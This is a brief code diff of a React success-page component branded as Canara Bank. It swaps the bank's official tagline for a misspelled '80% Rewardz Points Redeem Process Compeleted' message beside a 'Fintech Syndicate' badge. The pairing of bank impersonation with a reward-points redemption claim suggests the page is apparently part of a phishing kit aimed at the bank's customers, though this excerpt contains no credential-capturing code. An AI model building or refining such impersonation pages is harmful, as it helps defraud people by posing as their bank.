@@ -26,7 +26,7 @@ const SuccessPage = () => {
         <div className="flex items-center">
           <div className="text-white">
             <h1 className="text-3xl font-serif">Canara Bank</h1>
-            <p className="text-sm">A Government of India Undertaking</p>
+            <p className="text-sm">80% Rewardz Points Redeem Process Compeleted</p>
             <div className="bg-yellow-100 text-yellow-800 px-2 py-0.5 text-xs mt-1 rounded inline-block">
               Fintech Syndicate
             </div>
